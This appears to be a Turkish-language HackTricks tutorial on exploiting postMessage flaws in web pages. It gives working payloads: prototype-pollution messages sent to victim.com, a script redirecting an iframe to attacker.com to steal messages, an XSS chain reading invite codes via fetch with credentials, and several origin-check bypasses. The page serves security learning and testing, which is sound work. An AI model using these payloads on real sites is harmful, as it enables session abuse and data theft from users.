# PostMessage Zafiyetleri

## PostMessage Zafiyetleri

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## **PostMessage** Gönderme

**PostMessage**, bir mesaj göndermek için aşağıdaki işlevi kullanır:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
**targetOrigin** hedefOrigin olarak adlandırılan bir '\*' veya _https://company.com_ gibi bir URL olabilir. İkinci senaryoda, mesaj yalnızca bu etki alanına gönderilebilir (pencere nesnesinin kökeni farklı olsa bile). Joker karakter kullanılırsa, mesajlar herhangi bir etki alanına gönderilebilir ve pencere nesnesinin kökenine gönderilir.

### iframe ve hedefOrigin'deki joker karaktere saldırma

[**Bu raporda**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) açıklandığı gibi, **X-Frame-Header** koruması olmayan bir sayfa bulursanız ve bu sayfa, bir **joker karakteri** (\*) kullanarak **postMessage** ile **duyarlı** bir mesaj gönderiyorsa, iframe'in **kökenini değiştirerek** duyarlı mesajı size ait bir etki alanına sızdırabilirsiniz.\
Sayfa iframelenebilir olsa da, **hedefOrigin** bir URL yerine bir joker karaktere ayarlanmışsa, bu hile işe yaramaz.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener sömürüsü

**`addEventListener`**, JS tarafından **`postMessage` bekleyen** fonksiyonun tanımlandığı fonksiyondur.\
Aşağıdaki gibi bir kod kullanılacaktır:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Bu durumda, kodun yaptığı **ilk şeyin kökeni kontrol etmek** olduğuna dikkat edin. Bu, sayfanın alınan bilgilerle (örneğin şifre değiştirme gibi) **duyarlı bir işlem yapacaksa** son derece **önemlidir**. **Kökeni kontrol etmezse, saldırganlar kurbanlarına bu uç noktalara keyfi veri göndermelerini sağlayabilir** ve kurbanların şifrelerini değiştirebilir (bu örnekte).

### Numaralandırma

Mevcut sayfadaki **olay dinleyicilerini bulmak** için şunları yapabilirsiniz:

* JS kodunda `window.addEventListener` ve `$(window).on` (_JQuery sürümü_) için **arama** yapın.
* Geliştirici araçları konsolunda şunu **yürütün**: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* Tarayıcının geliştirici araçlarında **Öğeler --> Olay Dinleyicileri**'ne gidin.

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) veya [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) gibi bir **tarayıcı eklentisi** kullanın. Bu tarayıcı eklentileri, **tüm iletileri** yakalar ve size gösterir.

### Köken kontrolü atlatmaları

- **`event.isTrusted`** özelliği, yalnızca gerçek kullanıcı eylemleriyle oluşturulan olaylar için `True` döndürdüğü için güvenli kabul edilir. Doğru bir şekilde uygulandığında atlatılması zor olsa da, güvenlik kontrollerindeki önemi dikkate değerdir.

- PostMessage olaylarında köken doğrulaması için **`indexOf()`** yöntemi atlatılabilir olabilir. Bu zafiyeti gösteren bir örnek:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- `String.prototype.search()`'den gelen **`search()`** yöntemi düzenli ifadeler için tasarlanmıştır, dize için değil. Düzenli ifade dışında başka bir şey geçirmek, yöntemin potansiyel olarak güvensiz olmasına neden olan bir düzenli ifadeye dönüşüm yapar. Çünkü düzenli ifadede nokta (.) bir joker karakteri olarak işlev görerek özel olarak oluşturulmuş alan adlarıyla doğrulamanın atlatılmasına izin verir. Örneğin:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- `search()` gibi **`match()`** işlevi de düzenli ifadeleri işler. Düzenli ifade yanlış yapılandırılmışsa, atlatılabilir olabilir.

- **`escapeHtml`** işlevi karakterleri kaçırarak girişleri temizlemek için tasarlanmıştır. Ancak, yeni bir kaçırılmış nesne oluşturmaz, mevcut nesnenin özelliklerini üzerine yazar. Bu davranış istismar edilebilir. Özellikle, bir nesne, kontrol edilen özelliği `hasOwnProperty` kabul etmeyen şekilde manipüle edilebilirse, `escapeHtml` beklenildiği gibi çalışmayacaktır. Aşağıdaki örneklerde bunun nasıl gösterildiği görülebilir:

- Beklenen Başarısızlık:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Kaçırma:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

Bu zafiyet bağlamında, `File` nesnesi, salt okunur `name` özelliği nedeniyle dikkate değer şekilde istismar edilebilir. Bu özellik, şablonlarda kullanıldığında `escapeHtml` işlevi tarafından temizlenmez ve potansiyel güvenlik risklerine yol açar.

- JavaScript'teki `document.domain` özelliği, bir betik tarafından etki alanını kısaltmak için ayarlanabilir ve aynı ana etki alanı içinde daha esnek aynı köken politikası uygulamasına olanak tanır.

### e.origin == window.origin atlatması

Bir **kumlu iframe** içinde bir web sayfası gömülürken %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, iframe'in kökeninin `null` olarak ayarlandığını anlamak önemlidir. Bu, özellikle **kumlu öznitelikler** ve bunların güvenlik ve işlevsellik üzerindeki etkileriyle ilgilenirken önemlidir.

Kumlu özniteliğinde **`allow-popups`** belirtilerek, iframe içinden açılan herhangi bir açılır pencere, ebeveyninin kumlu kısıtlamalarını devralır. Bu, açılır pencerenin kökeninin de `null` olarak ayarlandığı anlamına gelir ve iframe'in kökeniyle uyumlu olur.

Sonuç olarak, bu koşullar altında bir açılır pencere açıldığında ve iframe'den açılır pencereye bir mesaj **`postMessage`** kullanılarak gönderildiğinde, hem gönderen hem de alıcı uçların kökenleri `null` olarak ayarlanır. Bu durumda **`e.origin == window.origin`** ifadesi doğru değerlendirilir (`null == null`), çünkü hem iframe hem de açılır pencere, `null` olan aynı köken değerini paylaşırlar.

Daha fazla bilgi için **okuyun**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source atlatması

Mesajın, betiğin dinlediği pencereden gelip gelmediğini kontrol etmek mümkündür (özellikle **tarayıcı uzantılarından Görüntü Betikleri** için mesajın aynı sayfadan gönderilip gönderilmediğini kontrol etmek için özellikle ilginçtir):
```javascript
// If it’s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
**`e.source`** bir mesajın zorla null olmasını sağlayabilirsiniz, bunun için **postMessage** gönderen ve hemen silinen bir **iframe** oluşturmanız gerekmektedir.

Daha fazla bilgi için **okuyun:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header atlatma

Bu saldırıları gerçekleştirmek için ideal olarak **kurban web sayfasını** bir `iframe` içine yerleştirebilirsiniz. Ancak, `X-Frame-Header` gibi bazı başlıklar bu **davranışı engelleyebilir**.\
Bu senaryolarda daha az gizli bir saldırı kullanabilirsiniz. Savunmasız web uygulamasını yeni bir sekmede açabilir ve onunla iletişim kurabilirsiniz:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Ana sayfayı engelleyerek çocuğa gönderilen mesajı çalmak

Aşağıdaki sayfada, verileri göndermeden önce **ana** sayfayı **engelleyerek**, bir **çocuk iframe**'e gönderilen **duyarlı postmessage verilerini** çalabileceğinizi ve verilerin alınmadan önce bir **çocukta XSS** kullanarak verileri **sızdırabileceğinizi** görebilirsiniz:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Iframe konumunu değiştirerek mesaj çalmak

Eğer X-Frame-Header olmadan bir iframe içeren bir web sayfasını iframe'leyebilirseniz, o çocuk iframe'inin **konumunu değiştirebilirsiniz**, böylece bir **joker kullanarak** gönderilen bir **postmessage** alıyorsa, saldırgan o iframe'in **kökenini** kendisi tarafından **kontrol edilen** bir sayfaya **değiştirebilir** ve mesajı **çalabilir**:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage ile Prototype Pollution ve/veya XSS

`postMessage` aracılığıyla gönderilen verilerin JS tarafından çalıştırıldığı senaryolarda, **sayfayı iframe'leyebilir** ve `postMessage` aracılığıyla saldırıyı göndererek **prototype pollution/XSS**'i sömürebilirsiniz.

**Çok iyi açıklanan birkaç XSS örneği `postMessage` ile** [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html) adresinde bulunabilir.

Bir `iframe`'e **Prototype Pollution ve ardından XSS**'i sömürmek için bir `postMessage` ile yapılan bir saldırı örneği:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**Daha fazla bilgi için**:

* [**Prototip kirliliği**](../deserialization/nodejs-proto-prototype-pollution/) hakkında sayfaya bağlantı
* [**XSS**](../xss-cross-site-scripting/) hakkında sayfaya bağlantı
* [**İstemci tarafı prototip kirliliği ile XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss) hakkında sayfaya bağlantı

## Referanslar

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Pratik yapmak için: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
